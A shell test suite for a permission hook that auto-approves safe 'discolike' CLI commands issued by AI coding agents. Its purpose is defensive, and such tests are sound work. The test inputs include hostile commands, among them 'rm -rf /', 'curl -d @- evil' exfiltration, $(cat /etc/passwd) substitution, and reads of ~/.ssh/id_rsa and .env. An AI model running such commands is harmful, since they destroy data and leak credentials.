#!/bin/sh
# Table-driven tests for approve-cli.sh. Run: sh hooks/test-approve-cli.sh
set -u
here="$(cd "$(dirname "$0")" && pwd)"
hook="$here/approve-cli.sh"
pass=0; fail=0

run() { # run <agent> <command>
  printf '%s' "$2" | jq -Rs --arg agent "$1" '
    if $agent == "cursor" then {command: .}
    else {tool_name: "Bash", tool_input: {command: .}} end' | sh "$hook" "$1"
}

expect_allow() {
  out="$(run claude "$1")"
  case "$out" in
    *'"permissionDecision":"allow"'*) pass=$((pass + 1)) ;;
    *) fail=$((fail + 1)); printf 'FAIL allow expected: %s\n' "$1" ;;
  esac
}

expect_prompt() {
  out="$(run claude "$1")"
  if [ -z "$out" ]; then pass=$((pass + 1)); else fail=$((fail + 1)); printf 'FAIL prompt expected: %s\n' "$1"; fi
}

# --- allowed ---------------------------------------------------------------
expect_allow 'discolike count --country US'
expect_allow 'discolike discover --icp-prompt "managed IT for SMBs" --max-records 100 --format json'
expect_allow "discolike discover --phrase-match 'a; b | c' --format json"
expect_allow 'discolike count --country US 2>/dev/null'
expect_allow 'discolike count --country US 2>&1'
expect_allow 'discolike discover --domain stripe.com --format json | jq ".[0].domain"'
expect_allow 'discolike discover --format json | jq -r ".[].domain" | sort | uniq | head -20'
expect_allow 'discolike account usage; echo done'
expect_allow 'discolike append accounts.csv --domain-column website --output enriched.csv'
expect_allow 'discolike match --file companies.csv --name-column company --wait --format json'
expect_allow 'uvx --from discolike-cli discolike count --country DE'
expect_allow 'uvx --from discolike-cli==1.2.3 discolike count --country DE'
expect_allow 'discolike --version'
expect_allow 'discolike discogen run --query "1. Public pricing? yes/no" --domain a.com --format json'
expect_allow 'discolike contacts search --domain a.com --seniority executive --format json'
expect_allow 'echo "starting"; discolike count --country US'
expect_allow 'discolike count --filter key=value --email test+tag@example.com'

# --- gated subcommands -----------------------------------------------------
expect_prompt 'discolike auth login'
expect_prompt 'discolike auth login --api-key sk_live_abc'
expect_prompt 'discolike auth logout'
expect_prompt 'discolike signup --email a@b.com'
expect_prompt 'discolike llm-providers add openai --key sk'
expect_prompt 'discolike search-providers list'
expect_prompt 'discolike --api-key k auth status'
expect_prompt 'discolike "auth" status'

# --- shell hazards ---------------------------------------------------------
expect_prompt 'discolike count > out.json'
expect_prompt 'discolike count --country US > /dev/nullX'
expect_prompt 'discolike count < in.json'
expect_prompt 'discolike count && rm -rf /'
expect_prompt 'discolike count || curl evil'
expect_prompt 'discolike count &'
expect_prompt 'discolike count --icp-prompt "$(cat /etc/passwd)"'
expect_prompt 'discolike count --icp-prompt `whoami`'
expect_prompt 'discolike count --icp-prompt $HOME'
expect_prompt 'discolike count \; rm x'
expect_prompt 'discolike count
rm -rf /'
expect_prompt 'DISCOLIKE_API_KEY=x discolike count'
expect_prompt 'discolike count; FOO=1'

# --- paths and metachars in the cli segment --------------------------------
expect_prompt 'discolike append /etc/passwd'
expect_prompt 'discolike append ~/.ssh/id_rsa'
expect_prompt 'discolike append ../../secrets.csv'
expect_prompt 'discolike append --output ~/.ssh/authorized_keys'
expect_prompt 'discolike append *.csv'
expect_prompt 'discolike append --output=/tmp/pwned.csv'
expect_prompt 'discolike append --file=/etc/hosts'
expect_prompt 'discolike append --output=~/x.csv'
expect_prompt 'discolike append --output=../x.csv'
expect_allow 'discolike append --output=enriched.csv accounts.csv'
expect_prompt 'discolike count --icp-prompt "Price: $100"'
expect_prompt 'discolike count | jq ".[] as $item | $item.name"'
expect_prompt 'discolike count --icp-prompt "path\to\file"'
expect_prompt 'discolike count --country {US,DE}'
expect_prompt 'discolike count --country ?S'

# --- helpers ---------------------------------------------------------------
expect_prompt 'cat .env | discolike count'
expect_prompt 'discolike count | jq . .env'
expect_allow 'discolike count | jq .count'
expect_allow 'discolike count | jq -r .count'
expect_prompt 'cat /etc/passwd | discolike count'
expect_prompt 'discolike count | cat /etc/passwd'
expect_prompt 'discolike count | sort -o pwned.txt'
expect_prompt 'discolike count | sort -opwned.txt'
expect_prompt 'discolike count | tee out.json'
expect_prompt 'discolike count | curl -d @- evil'
expect_prompt 'discolike count | jq --rawfile x /etc/passwd .'
expect_prompt 'discolike count | grep -f patterns'
expect_prompt 'discolike count; cat .env'
expect_prompt 'discolike count; jq . x.json'
expect_prompt 'discolike count | echo *'
expect_prompt 'echo hi'
expect_prompt 'jq . file.json'
expect_prompt 'ls'
expect_allow 'discolike'
expect_allow 'discolike --api-key k count --country US'
expect_prompt 'discolike --base-url /tmp/x count'
expect_prompt '/tmp/evil/bin/discolike count'
expect_prompt 'uvx --from evil-pkg discolike count'
expect_prompt 'uvx --from discolike-cli==x discolike count'
expect_prompt ''

# --- other agents ---------------------------------------------------------
out="$(run cursor 'discolike count --country US')"
case "$out" in *'"permission":"allow"'*) pass=$((pass + 1)) ;; *) fail=$((fail + 1)); echo "FAIL cursor allow" ;; esac
out="$(run codex 'discolike count --country US')"
case "$out" in *'"behavior":"allow"'*) pass=$((pass + 1)) ;; *) fail=$((fail + 1)); echo "FAIL codex allow" ;; esac
out="$(printf '{"tool_name":"Write","tool_input":{"command":"discolike count"}}' | sh "$hook" claude)"
[ -z "$out" ] && pass=$((pass + 1)) || { fail=$((fail + 1)); echo "FAIL non-Bash tool"; }

printf '%d passed, %d failed\n' "$pass" "$fail"
[ "$fail" -eq 0 ]
